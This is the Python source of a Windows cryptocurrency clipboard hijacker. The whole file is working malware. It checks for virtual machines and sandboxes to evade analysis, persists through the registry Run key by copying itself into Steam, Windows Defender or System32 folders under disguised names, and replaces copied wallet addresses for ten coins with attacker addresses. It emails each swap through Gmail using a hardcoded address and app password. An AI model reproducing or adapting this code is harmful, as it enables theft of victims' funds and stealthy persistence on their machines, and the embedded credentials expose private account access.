# TODO: улучшение скрытности, регулярные выражения, улучшение детекта виртуалки(делаем тесты и решаем допилить или оставить)
# v1.5

import getpass
import shutil
import smtplib
import sys
import os
import re
import pyperclip
import psutil
import time
import subprocess as sp
#import requests
from winreg import *

# Virtualization detect
tasks=sp.getoutput('tasklist')# take list of proceses
taskslist=tasks.split(' ')# split they by 'space'

try:
	for i in taskslist: # check tasks
		if re.search('VBoxTray.exe',i) or re.search('VBoxService.exe',i) or re.search('prl_cc.exe',i) or re.search('prl_tools.exe',i) or re.search('SharedIntApp.exe',i) or re.search('vmusrvc.exe',i) or re.search('vmsrvc.exe',i) or re.search('vmtoolsd.exe',i):
			print(f'Task:{i} [-] Detect VM by process!')
			sys.exit()
		else:
			pass
except Exception as e:
	print(e)

else:
	for i in shutil.disk_usage('/'): # check disk size
		if i < 64424509440:
			print('[-] Detect VM by disk size!')
			sys.exit()
		else:
			pass
		break

	if psutil.cpu_count(logical=False) == 1: # check processor cores 
		print('[-] Detect VM by processor cores!')
		sys.exit()
	else:
		pass

	if getpass.getuser()=='test' or getpass.getuser()=='vboxuser': # check username
		print('Detect VM by username!')
		sys.exit()
	else:
		pass

	print('[+] VM does not detected') #finally, if all checks is good

# Country Checker
#ip = requests.get('https://api.ipify.org').text
#countrys = ('Россия', 'Беларусь')
#country = requests.get('http://ip-api.com/json/' + ip).json()['country']
#for i in countrys:
#	if country != i:
#		pass
#	else:
#		sys.exit()

# Path autoruns
newfilepath = os.path.dirname(os.path.realpath(__file__)) + '\\' + sys.argv[0].split('\\')[-1]
systemdrive = os.getenv("SystemDrive")

# Autorun
keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
#key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
#SetValueEx(key, '', 0, REG_SZ, newfilepath)
#print('[*] Registr key sucсsessfully added')

# Steamclone autorun
succsess_add = False
try:
	steamkey = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
	shutil.copy(newfilepath, fr'{systemdrive}\Program Files (x86)\Steam\bin')
	steampath = fr'{systemdrive}\Program Files (x86)\Steam\bin' + "\\" + sys.argv[0].split('\\')[-1]
	SetValueEx(steamkey, 'SteamNetworkLoader', 0, REG_SZ, steampath)
	succsess_add = True
	print('[+] Registr steamkey sucсsessfully added')
except:
	print('[-] Registr steamkey did not added')

if succsess_add == False: # if first copying is not succsess
	try:
		defkey = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
		shutil.copy(newfilepath, fr'{systemdrive}\Program Files (x86)\Steam\bin')
		defpath = fr'{systemdrive}\Program Files\Windows Defender' + "\\" + sys.argv[0].split('\\')[-1]
		SetValueEx(defkey, 'WindowsDefenderHost', 0, REG_SZ, defpath)
		succsess_add = True
		print('[+] Registr windefkey sucсsessfully added')
	except:
		print('[-] Registr windefkey did not added')

if succsess_add == False: # if second copying is not succsess
	try:
		# Windows\System32 copying and autorun
		sys32key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
		shutil.copy(newfilepath, fr'{systemdrive}\Program Files (x86)\Steam\bin')
		sys32path = fr'{systemdrive}\Windows\System32' + "\\" + sys.argv[0].split('\\')[-1]
		SetValueEx(sys32key, 'WindowsDefenderHost', 0, REG_SZ, sys32path)
		succsess_add = True
		print('[+] Registr system32key sucсsessfully added')
	except:
		print('[-] Registr system32key did not added')

btc_adr = "btc_adress"
eth_adr = 'eth_adress'
xmr_adr = 'xmr_adress'
ada_adr = 'ada_adress'
doge_adr = 'doge_adress'
ltc_adr = 'ltc_adress'
dash_adr = 'dash_adress'
trx_adr = 'trx_adress'
ton_adr = 'ton_adress'
bch_adr = 'bch_adress'

# mail data
sender = 'antonvulob@gmail.com'
receiver = 'antonvulob@gmail.com'
password = 'rqonrzflrcmixunq'

def send_mail(adress, new_adress): # mail main function
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	try:
		server.login(sender, password)
		message = f"Detected adress: {adress}\nChanged adress: {new_adress}"
		server.sendmail(sender, receiver, f"Subject: Clipper (Check this mail in original) \n{message}")
		print(f"[+] The message with adresses has been sended on mail {receiver}")
	except Exception as e:
		print(f"{e}")

#sleeptime = 60
#print(f'Sleeping for {sleeptime} seconds')
#time.sleep(sleeptime)
print('[*] Base module start working')

try:
	while True:
		text = pyperclip.paste()
		if (len(text) > 30 and len(text) < 64) and (text[:1]=='1' or text[:1]=='3'or text[:3]=='bc1'): #bitcoin
			print("Detected btc adress")
			pyperclip.copy(btc_adr)
			send_mail(text, btc_adr)

		elif (len(text) > 39 and len(text) < 64) and (text[:2]=='0x'): #ethereum
			print("Detected eth adress")
			pyperclip.copy(eth_adr)
			send_mail(text, eth_adr)

		elif (len(text) > 80 and len(text) < 96) and (text[:1]=='4' or text[:1]=='8'): #monero
			print("Detected xmr adress")
			pyperclip.copy(xmr_adr)
			send_mail(text, xmr_adr)

		elif (len(text) > 45 and len(text) < 124) and (text[:1]=='A' or text[:1]=='D' or text[:5]=='addr1'): #cardano
			print("Detected ada adress")
			pyperclip.copy(ada_adr)
			send_mail(text, ada_adr)

		elif (len(text) > 30 and len(text) < 45) and (text[:1]=='D'): #dogecoin
			print("Detected doge adress")
			pyperclip.copy(doge_adr)
			send_mail(text, doge_adr)

		elif (len(text) > 30 and len(text) < 40) and (text[:1]=='L' or text[:1]=='3' or text[:3]=='ltc' or text[:1]=='M'): #litecoin
			print("Detected ltc adress")
			pyperclip.copy(ltc_adr)
			send_mail(text, ltc_adr)

		elif (len(text) > 30 and len(text) < 37) and (text[:1]=='X'): #dash
			print("Detected dash adress")
			pyperclip.copy(dash_adr)
			send_mail(text, dash_adr)

		elif (len(text) > 40 and len(text) < 90) and (text[:1]=='T'): #tron
			print("Detected trx adress")
			pyperclip.copy(trx_adr)
			send_mail(text, trx_adr)

		elif (len(text) > 40 and len(text) < 50) and (text[:1]=='E'): #ton
			print("Detected ton adress")
			pyperclip.copy(ton_adr)
			send_mail(text, ton_adr)

		elif (len(text) > 50 and len(text) < 90) and (text[:1]=='q' or text[:1]=='p' or text[:12]=='bitcoincash:'): #bitcoin cash
			print("Detected bch adress")
			pyperclip.copy(bch_adr)
			send_mail(text, bch_adr)
		else:
			pass
except KeyboardInterrupt:
	print('------ KeyboardInterrupt ------')